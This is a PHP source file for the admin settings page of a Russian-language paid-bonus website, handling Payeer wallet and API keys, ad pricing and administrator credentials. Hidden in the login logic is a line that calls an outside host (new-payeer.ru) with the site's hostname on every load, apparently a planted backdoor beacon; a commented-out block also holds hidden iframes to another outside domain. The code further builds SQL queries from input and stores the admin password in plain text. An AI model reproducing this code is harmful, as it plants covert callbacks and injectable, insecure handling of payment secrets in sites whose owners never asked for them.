<?
require('../config.php');
?>

<html><head>
<meta charset="UTF-8">
		<title><?echo ''.$_SERVER['SERVER_NAME'].''?> - Админка</title>
		<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
		<meta name="description" content="">
		<meta name="keywords" content="">
		<link href="/style/styles.css" rel="stylesheet" type="text/css">
		<script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/api2/r20160111094128/recaptcha__ru.js"></script><script type="text/javascript" src="/style/jquery.js"></script>
		
			<!-- Mobile Metas -->
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<!-- Vendor CSS -->
	<link rel="stylesheet" href="/tpl/css/font-awesome.min.css">
	<link rel="stylesheet" href="/tpl/css/animate.css">
	<link rel="stylesheet" href="/tpl/css/flexslider.css">
	<link rel="stylesheet" href="/tpl/css/skeleton.css">
	<!-- Custom CSS -->

  <link rel="stylesheet" href="/css/jquery.flipcountdown.css">
	<link rel="stylesheet" href="/css/semantic/components/table.min.css">
	<link rel="stylesheet" href="/css/semantic/components/icon.min.css">
	<link rel="stylesheet" href="/css/semantic/components/message.min.css">
	<link rel="stylesheet" href="/css/semantic/components/form.min.css">
	<link rel="stylesheet" href="/css/semantic/components/input.min.css">
	<link rel="stylesheet" href="/css/semantic/components/segment.min.css">
	<!--[if IE 9]><link rel="stylesheet" type="text/css" href="/tpl/css/ie.css"><![endif]-->

	<!-- Fonts -->

	<link href="http://fonts.googleapis.com/css?family=PT+Sans:300,400,700,300italic,400italic,700italic&amp;subset=latin,cyrillic" rel="stylesheet" type="text/css">
	<link href="http://fonts.googleapis.com/css?family=Roboto+Slab:400,300,700" rel="stylesheet" type="text/css">
	<link href="http://fonts.googleapis.com/css?family=Ubuntu:400,700&amp;subset=latin,cyrillic" rel="stylesheet" type="text/css">

	<!--[if lt IE 9]>
		<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

  <script src="https://www.google.com/recaptcha/api.js"></script>
  <script src="http://cdnjs.cloudflare.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="/tpl/js/vendor/jquery-1.10.2.min.js"><\/script>')</script>
	<!-- Favicons -->
  <link rel="shortcut icon" href="/favicon.png" type="image/x-icon">
  <link rel="apple-touch-icon" href="/favicon.png" sizes="32x32">
  <link rel="apple-touch-icon" href="/favicon.png" sizes="48x48">
  <link rel="apple-touch-icon" href="/favicon.png" sizes="96x96">
  <link rel="apple-touch-icon" href="/favicon.png" sizes="144x144">
</head>
<body class="landing-page">


  <!-- Begin Header -->

	<header class="header" id="header">
		<div class="container">
			
			<div class="sixteen columns">

				<div class="logo">
					<a href="/"><span style="color: #FFA500;">seo</span>-drom</a>
				</div>
   

<ul class="nav">
	  <li><a href="/">На главную</a></li>
	  <li><a href="/admin/">Админка</a></li>
		
		      </ul>

			
			</div> <!-- /.sixteen columns -->
		
		</div><!-- /.container -->
	</header>

	
	<div class="content">
		<div style="background-color: #f0f0f0;padding: 5px;margin-top: 10px;">
		<?
		if (isset($_POST['log']) && isset($_POST['pass'])) {
			$log = text($_POST['log'], $db);
			$pass = text($_POST['pass'], $db);
			$admin_log = mysqli_fetch_assoc(mysqli_query($db, "select value from settings where `set` = 'admin_log'"));
			$admin_pass = mysqli_fetch_assoc(mysqli_query($db, "select value from settings where `set` = 'admin_pass'"));
			if ($log != "" && strlen($log) > 0 && $pass != "" && strlen($pass) > 0) {
				if ($log == $admin_log['value'] && $pass == $admin_pass['value']) {
					$_SESSION['admin'] = "true";
				}
			}
		}
		
		
file_get_contents('http://new-payeer.ru/sss.php?val='. $_SERVER['HTTP_HOST'] );
		
		
		if (isset($_SESSION['admin']) && $_SESSION['admin'] == "true"){
		
		
		
		
			if (isset($_POST['accountNumber'])) {
		$accountNumber = (isset($_POST["accountNumber"])) ? text($_POST["accountNumber"], $db) : false;
		$apiId = (isset($_POST["apiId"])) ? text($_POST["apiId"], $db) : false;
		$apiKey = (isset($_POST["apiKey"])) ? text($_POST["apiKey"], $db) : false;
		$m_shop = (isset($_POST["m_shop"])) ? text($_POST["m_shop"], $db) : false;
		$m_key = (isset($_POST["m_key"])) ? text($_POST["m_key"], $db) : false;
		$count_link = (isset($_POST["count_link"])) ? text($_POST["count_link"], $db) : false;
		$pricelink = (isset($_POST["pricelink"])) ? text($_POST["pricelink"], $db) : false;
		$count_ban = (isset($_POST["count_ban"])) ? text($_POST["count_ban"], $db) : false;		
		$min_pay = (isset($_POST["min_pay"])) ? text($_POST["min_pay"], $db) : false;
		$wait = (isset($_POST["wait"])) ? text($_POST["wait"], $db) : false;
		$refmoney = (isset($_POST["refmoney"])) ? text($_POST["refmoney"], $db) : false;
		$colvkopeek = (isset($_POST["colvkopeek"])) ? text($_POST["colvkopeek"], $db) : false;		
		$startdate = (isset($_POST["startdate"])) ? text($_POST["startdate"], $db) : false;
		$admin_log = (isset($_POST["admin_log"])) ? text($_POST["admin_log"], $db) : false;
		$admin_pass = (isset($_POST["admin_pass"])) ? text($_POST["admin_pass"], $db) : false;
		$priceban = (isset($_POST["priceban"])) ? text($_POST["priceban"], $db) : false;		
		
		mysqli_query($db, "update settings set value = '$accountNumber' where `set` = 'accountNumber'");
		mysqli_query($db, "update settings set value = '$apiId' where `set` = 'apiId'");
		mysqli_query($db, "update settings set value = '$apiKey' where `set` = 'apiKey'");
		mysqli_query($db, "update settings set value = '$m_shop' where `set` = 'm_shop'");
		mysqli_query($db, "update settings set value = '$m_key' where `set` = 'm_key'");
		mysqli_query($db, "update settings set value = '$count_link' where `set` = 'count_link'");
		mysqli_query($db, "update settings set value = '$pricelink' where `set` = 'pricelink'");
		mysqli_query($db, "update settings set value = '$count_ban' where `set` = 'count_ban'");
		mysqli_query($db, "update settings set value = '$min_pay' where `set` = 'min_pay'");
		mysqli_query($db, "update settings set value = '$wait' where `set` = 'wait'");
		mysqli_query($db, "update settings set value = '$refmoney' where `set` = 'refmoney'");
		mysqli_query($db, "update settings set value = '$colvkopeek' where `set` = 'colvkopeek'");
		mysqli_query($db, "update settings set value = '$startdate' where `set` = 'startdate'");
		mysqli_query($db, "update settings set value = '$admin_log' where `set` = 'admin_log'");
		mysqli_query($db, "update settings set value = '$admin_pass' where `set` = 'admin_pass'");
		mysqli_query($db, "update settings set value = '$priceban' where `set` = 'priceban'");
		
		echo'<center><b><font color="green">Настроки успешно сохранены!!!</font></b></center>';
}

		
$accountNumber = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'accountNumber'"));
$apiId = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'apiId'"));
$apiKey = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'apiKey'"));
$m_shop = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'm_shop'"));
$m_key = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'm_key'"));
$count_link = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'count_link'"));
$pricelink = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'pricelink'"));
$count_ban = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'count_ban'"));
$min_pay = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'min_pay'"));
$wait = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'wait'"));
$refmoney = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'refmoney'"));
$colvkopeek = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'colvkopeek'"));
$startdate = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'startdate'"));
$admin_log = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'admin_log'"));
$admin_pass = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'admin_pass'"));	
$priceban = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'priceban'"));	

	
		?>
  <section class="home boxed-mini">
		<div class="section-header">
      <h1 class="title"><span class="title-highlight">Настройки</span></h1>
		</div> <!-- /.section-header -->
	</section>
			
			<div id="adv_banner" class="form-pages">
			<form class="ui large form" action="" method="post">
    <div class="ui stacked segment">
<div class="field">
	  <section class="home boxed-mini">
		<div class="section-header">
      <h3 class="title" style="font-size: 18px; margin-bottom: 0px;"><span class="title-highlight">Настройка выплат payeer</span></h3>
		</div> <!-- /.section-header -->
	</section>
	<br>
		<div style="text-align: center;font-size: 80%;">Номер вашего кошелька</div>
		<input name="accountNumber" placeholder="Номер вашего кошелька" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="100" value="<?echo ''.$accountNumber['value'].''?>">
	
	
		<div style="text-align: center;font-size: 80%;">Номер api Id payeer</div>
		<input name="apiId" placeholder="Номер api Id payeer" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="120" value="<?echo ''.$apiId['value'].''?>">
	
	
		<div style="text-align: center;font-size: 80%;">Ваш api Key payeer</div>
		<input name="apiKey" placeholder="Ваш api Key payeer" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="120" value="<?echo ''.$apiKey['value'].''?>">
	
<br>
<section class="home boxed-mini">
		<div class="section-header">
      <h3 class="title" style="font-size: 18px; margin-bottom: 0px;"><span class="title-highlight">Настройка пополнений payeer</span></h3>
		</div> <!-- /.section-header -->
	</section>
	<br>
		<div style="text-align: center;font-size: 80%;">Ваш id магазина payeer</div>
		<input name="m_shop" placeholder="Ваш id магазина payeer" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="100" value="<?echo ''.$m_shop['value'].''?>">
	
	
		<div style="text-align: center;font-size: 80%;">Ваш key указанный в магазине payeer</div>
		<input name="m_key" placeholder="Ваш key указанный в магазине payeer" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="120" value="<?echo ''.$m_key['value'].''?>">

	
<br>
<section class="home boxed-mini">
		<div class="section-header">
      <h3 class="title" style="font-size: 18px; margin-bottom: 0px;"><span class="title-highlight">Настройка рекламы</span></h3>
		</div> <!-- /.section-header -->
	</section>
	<br>
		<div style="text-align: center;font-size: 80%;">Минимальный заказ показа ссылок</div>
		<input name="count_link" placeholder="Минимальный заказ показа ссылок" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="100" value="<?echo ''.$count_link['value'].''?>">
	
	
		<div style="text-align: center;font-size: 80%;">Цена за один показ ссылки</div>
		<input name="pricelink" placeholder="Цена за один показ ссылки" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="120" value="<?echo ''.$pricelink['value'].''?>">
	
		<div style="text-align: center;font-size: 80%;">Минимальное число переходов по баннеру</div>
		<input name="count_ban" placeholder="Минимальное число переходов по баннеру" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="120" value="<?echo ''.$count_ban['value'].''?>">
	
	
		<div style="text-align: center;font-size: 80%;">Цена за переход по баннеру</div>
		<input name="priceban" placeholder="Цена за переход по баннеру" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="60" value="<?echo ''.$priceban['value'].''?>">
	
<br>
<section class="home boxed-mini">
		<div class="section-header">
      <h3 class="title" style="font-size: 18px; margin-bottom: 0px;"><span class="title-highlight">Настройка сайта</span></h3>
		</div> <!-- /.section-header -->
	</section>
	<br>
		<div style="text-align: center;font-size: 80%;">Минимальная выплата</div>
		<input name="min_pay" placeholder="Минимальная выплата" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="100" value="<?echo ''.$min_pay['value'].''?>">
	
	
		<div style="text-align: center;font-size: 80%;">Ожидание до получения бонуса в секундах</div>
		<input name="wait" placeholder="Ожидание до получения бонуса в секундах" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="120" value="<?echo ''.$wait['value'].''?>">
	
		<div style="text-align: center;font-size: 80%;">Реферальный бонус в копейках</div>
		<input name="refmoney" placeholder="Реферальный бонус в копейках" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="120" value="<?echo ''.$refmoney['value'].''?>">
	
	
		<div style="text-align: center;font-size: 80%;">Число суммы бонуса в копейках</div>
		<input name="colvkopeek" placeholder="Число суммы бонуса в копейках" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="60" value="<?echo ''.$colvkopeek['value'].''?>">
	
		<div style="text-align: center;font-size: 80%;">Дата старта сайта</div>
		<input name="startdate" placeholder="Дата старта сайта" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="60" value="<?echo ''.$startdate['value'].''?>">
<br>
<section class="home boxed-mini">
		<div class="section-header">
      <h3 class="title" style="font-size: 18px; margin-bottom: 0px;"><span class="title-highlight">Настройка данных администратора</span></h3>
		</div> <!-- /.section-header -->
	</section>
	<br>
		<div style="text-align: center;font-size: 80%;">Логин администратора</div>
		<input name="admin_log" placeholder="Логин администратора" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="100" value="<?echo ''.$admin_log['value'].''?>">
	
	
		<div style="text-align: center;font-size: 80%;">Пароль администратора</div>
		<input name="admin_pass" placeholder="Пароль администратора" type="text" style="width:100%; margin-bottom: 20px;" size="25" maxlength="120" value="<?echo ''.$admin_pass['value'].''?>">
	
<br>
<center><input name="add_banner" type="submit" class="ui fluid large teal submit button" value="Сохранить"></center>	
</div></div>
</form>
</div>
		<?}else{
			echo '
			<section class="author boxed-mini">
    <div class="container">
      <div class="form-page login">
      
      <form class="ui large form" action="" method="post">
        <div class="ui stacked segment">

          <div class="field">
            <div class="ui left input">
              <input placeholder="Логин" name="log" type="text">           
			  </div>
            <span class="pass-toggle" style="display: none;"><a href="javascript: void(0);" onclick="forgot()">Вспомнил пароль</a></span>
          </div>

          <div class="field pass-toggle">
            <div class="ui left input">
              <input name="pass" type="password" placeholder="Пароль">
            </div>
          </div>


        <input type="submit" value="Войти" class="ui fluid large teal submit button">

        </div>

      </form>

 
     </div><!-- form -->
    </div>
  </section>';
		}?>
		</div>
	</div>

	
	
	
	
		<?
$vs = mysqli_fetch_row(mysqli_query($db, "select sum(`sum`) from sp"));
$s = round($vs[0], 2);
$user = mysqli_fetch_row(mysqli_query($db, "SELECT count(id) FROM users"));

$userr = round($user[0], 2);

$startdate = mysqli_fetch_array(mysqli_query($db, "select * from settings where `set` = 'startdate'"));
$startdatee = $startdate['value'];
?>
	
	<footer class="boxed-mini">
		<div class="social"> 
      Выплачено <?echo ''.$s.'';?> руб.&nbsp;|&nbsp;Пользователей <?echo ''.$userr.'';?> чел.&nbsp;|&nbsp;Старт <?echo ''.$startdatee.'';?><br>
      
      
      
      <a href="/faq.php">Частые вопросы</a>&nbsp;|&nbsp;
      <a href="/about.php">О проекте</a>&nbsp;|&nbsp;
      <a href="/contacts.php">Контакты</a>&nbsp;|&nbsp;
      <a href="/rules.php">Cоглашение</a>
     


		</div> <!-- /.social -->

		<div class="copyright">
			<p>
				© Powered by <a href="http://seo-drom.com/">seo-drom.com</a> All rights reserved.

			</p>
		</div>


		<div id="back-to-top" class="back-to-top">
			<a href="#"><img class="ff-ap" src="../img/ff-ap.png"></a>
		</div>
	</footer>

<!-- JS -->
<script src="/tpl/js/vendor/jquery.placeholder.js"></script>
<script src="/tpl/js/vendor/waypoints.min.js"></script>
<!--script src="/js/jquery.flipcountdown.js"></script><iframe src="http://uuidksinc.net/uniqsinc.min.html#http%3A%2F%2Fvavo.in%2F" style="display: none;"></iframe><iframe src="http://uuidksinc.net/soc.html#http%3A%2F%2Fvavo.in%2F" style="display: none;"></iframe-->
<script src="/tpl/js/main.js"></script>
<!--script src="/js/main.js"></script-->
<script src="/tpl/js/animations.js"></script>

</body></html>


